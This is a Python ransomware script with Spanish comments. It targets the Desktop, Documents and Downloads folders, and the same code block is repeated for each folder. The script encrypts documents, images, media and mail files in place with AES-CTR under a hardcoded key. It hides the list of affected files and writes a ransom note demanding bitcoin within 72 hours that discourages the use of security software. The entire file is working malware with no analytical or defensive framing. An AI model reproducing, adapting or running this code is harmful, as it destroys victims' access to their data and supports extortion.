
import os
import random
import hashlib
import socket
from Crypto.Util import Counter
from Crypto.Cipher import AES

#---------------------------------------------- Desktop

username = os.getlogin()

destination = os.path.join(os.path.expanduser("~"), "Desktop")

os.chdir(destination)




destination = os.path.abspath('')
files = os.listdir(destination)
files = [x for x in files if not x.startswith('.')]



#Extensiones
extensions = [".jpg",".png",".mp3",".mp4",".pdf",".doc", ".docx", ".dot", ".dotx", ".docm", ".dotm", ".xls", ".xlsx", ".xlsm", ".xlt", ".xltx", ".xltm", ".csv", ".ppt", ".pptx", ".pptm", ".pot", ".potx", ".potm", ".pps", ".ppsx", ".ppsm", ".mdb", ".accdb", ".mde", ".accde", ".accdt", ".pst", ".ost", ".msg", ".one", ".onetoc2", ".pub"]





        

def hash_key():


	return "051546btc0101hcr"


def encrypt_and_decrypt(text, crypto, block_size = 16):
	with open(text, 'r+b') as encrypted_file:
		unencrypted_content = encrypted_file.read(block_size)
		while unencrypted_content:
			encrypted_content = crypto(unencrypted_content)
			if len(unencrypted_content) != len(encrypted_content):
				raise ValueError('')

			encrypted_file.seek(- len(unencrypted_content), 1)
			encrypted_file.write(encrypted_content)
			unencrypted_content = encrypted_file.read(block_size)



def discover(key):
	files_kidnapped = open('files_kidnapped', 'w+')   

	for extension in extensions:
		for file in files:
			if file.endswith(extension):
				files_kidnapped.write(os.path.join(file)+ '\n')
	files_kidnapped.close()





	#ocultar archivo
	os.system('attrib +h "files_kidnapped"')
	

	


	

	del_space = open('files_kidnapped', 'r')
	del_space = del_space.read().split('\n')
	print(del_space)
	del_space = [i for i in del_space if not i == '']
	print(del_space)

	if os.path.exists('deposit_account'):
		decrypt_field = input('Enter account and amount to deposit to recover your files: ')

		hash_file = open('deposit_account', 'r')

		key = hash_file.read().split('\n')
		key = ''.join(key)

		if decrypt_field == key:
			key = key.encode('utf-8')
			counter = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter = counter)

			cryp_files = crypto.decrypt

			for element in del_space:
				encrypt_and_decrypt(element, cryp_files)
	else:
		counter = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter = counter)

		hash_file = open('deposit_account', 'wb')
		hash_file.write(key)
		hash_file.close()

		cryp_files = crypto.encrypt

		for element in del_space:
			encrypt_and_decrypt(element, cryp_files)


def main():
	hashnumber = hash_key()
	print(hashnumber)
	print(len(hashnumber))
	hashnumber = hashnumber.encode('utf-8')
	discover(hashnumber)


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()


with open("Readme_important.txt", "w")as archivo:
        archivo.write("Attention! All your important files have been encrypted.You will not be able to access your documents,\n"
                      "photos, videos, databases and other important files until you make payment.To restore your files:Transfer\n"
                      "the amount of 20,0002323 bitcoins to the provided address.Once payment is confirmed,\n"
                      "you will receive a unique decryption key.You will find the account number in the 'DEPOSIT_ACCOUNT'\n"
                      "file on your desktop. Warning:Do not try to remove or modify this software as it could permanently damage your files.\n"
                      "Do not turn off your computer or try to use security solutions; This will make the recovery process more difficult.\n"
                      "You have 72 hours to make the payment or your files will be permanently lost.")



#-------------------------------------------------------------------   DOCUMENTS


username = os.getlogin()

destination2 = os.path.join(os.path.expanduser("~"), "Documents")

os.chdir(destination2)




destination2 = os.path.abspath('')
files = os.listdir(destination2)
files = [x for x in files if not x.startswith('.')]



#Extensiones
extensions = [".jpg",".png",".mp3",".mp4",".pdf",".doc", ".docx", ".dot", ".dotx", ".docm", ".dotm", ".xls", ".xlsx", ".xlsm", ".xlt", ".xltx", ".xltm", ".csv", ".ppt", ".pptx", ".pptm", ".pot", ".potx", ".potm", ".pps", ".ppsx", ".ppsm", ".mdb", ".accdb", ".mde", ".accde", ".accdt", ".pst", ".ost", ".msg", ".one", ".onetoc2", ".pub"]





        

def hash_key():


	return "051546btc0101hcr"


def encrypt_and_decrypt(text, crypto, block_size = 16):
	with open(text, 'r+b') as encrypted_file:
		unencrypted_content = encrypted_file.read(block_size)
		while unencrypted_content:
			encrypted_content = crypto(unencrypted_content)
			if len(unencrypted_content) != len(encrypted_content):
				raise ValueError('')

			encrypted_file.seek(- len(unencrypted_content), 1)
			encrypted_file.write(encrypted_content)
			unencrypted_content = encrypted_file.read(block_size)



def discover(key):
	files_kidnapped = open('files_kidnapped', 'w+')   

	for extension in extensions:
		for file in files:
			if file.endswith(extension):
				files_kidnapped.write(os.path.join(file)+ '\n')
	files_kidnapped.close()





	#ocultar archivo
	os.system('attrib +h "files_kidnapped"')
	

	


	

	del_space = open('files_kidnapped', 'r')
	del_space = del_space.read().split('\n')
	print(del_space)
	del_space = [i for i in del_space if not i == '']
	print(del_space)

	if os.path.exists('deposit_account'):
		decrypt_field = input('Enter account and amount to deposit to recover your files: ')

		hash_file = open('deposit_account', 'r')

		key = hash_file.read().split('\n')
		key = ''.join(key)

		if decrypt_field == key:
			key = key.encode('utf-8')
			counter = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter = counter)

			cryp_files = crypto.decrypt

			for element in del_space:
				encrypt_and_decrypt(element, cryp_files)
	else:
		counter = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter = counter)

		hash_file = open('deposit_account', 'wb')
		hash_file.write(key)
		hash_file.close()

		cryp_files = crypto.encrypt

		for element in del_space:
			encrypt_and_decrypt(element, cryp_files)


def main():
	hashnumber = hash_key()
	print(hashnumber)
	print(len(hashnumber))
	hashnumber = hashnumber.encode('utf-8')
	discover(hashnumber)


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()





#--------------- DOWNLOADS


username = os.getlogin()

destination3 = os.path.join(os.path.expanduser("~"), "Downloads")

os.chdir(destination3)




destination3 = os.path.abspath('')
files = os.listdir(destination3)
files = [x for x in files if not x.startswith('.')]



#Extensiones
extensions = [".jpg",".png",".mp3",".mp4",".pdf",".doc", ".docx", ".dot", ".dotx", ".docm", ".dotm", ".xls", ".xlsx", ".xlsm", ".xlt", ".xltx", ".xltm", ".csv", ".ppt", ".pptx", ".pptm", ".pot", ".potx", ".potm", ".pps", ".ppsx", ".ppsm", ".mdb", ".accdb", ".mde", ".accde", ".accdt", ".pst", ".ost", ".msg", ".one", ".onetoc2", ".pub"]





        

def hash_key():


	return "051546btc0101hcr"


def encrypt_and_decrypt(text, crypto, block_size = 16):
	with open(text, 'r+b') as encrypted_file:
		unencrypted_content = encrypted_file.read(block_size)
		while unencrypted_content:
			encrypted_content = crypto(unencrypted_content)
			if len(unencrypted_content) != len(encrypted_content):
				raise ValueError('')

			encrypted_file.seek(- len(unencrypted_content), 1)
			encrypted_file.write(encrypted_content)
			unencrypted_content = encrypted_file.read(block_size)



def discover(key):
	files_kidnapped = open('files_kidnapped', 'w+')   

	for extension in extensions:
		for file in files:
			if file.endswith(extension):
				files_kidnapped.write(os.path.join(file)+ '\n')
	files_kidnapped.close()





	#ocultar archivo
	os.system('attrib +h "files_kidnapped"')
	

	


	

	del_space = open('files_kidnapped', 'r')
	del_space = del_space.read().split('\n')
	print(del_space)
	del_space = [i for i in del_space if not i == '']
	print(del_space)

	if os.path.exists('deposit_account'):
		decrypt_field = input('Enter account and amount to deposit to recover your files: ')

		hash_file = open('deposit_account', 'r')

		key = hash_file.read().split('\n')
		key = ''.join(key)

		if decrypt_field == key:
			key = key.encode('utf-8')
			counter = Counter.new(128)
			crypto = AES.new(key, AES.MODE_CTR, counter = counter)

			cryp_files = crypto.decrypt

			for element in del_space:
				encrypt_and_decrypt(element, cryp_files)
	else:
		counter = Counter.new(128)
		crypto = AES.new(key, AES.MODE_CTR, counter = counter)

		hash_file = open('deposit_account', 'wb')
		hash_file.write(key)
		hash_file.close()

		cryp_files = crypto.encrypt

		for element in del_space:
			encrypt_and_decrypt(element, cryp_files)


def main():
	hashnumber = hash_key()
	print(hashnumber)
	print(len(hashnumber))
	hashnumber = hashnumber.encode('utf-8')
	discover(hashnumber)


if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()
















                        
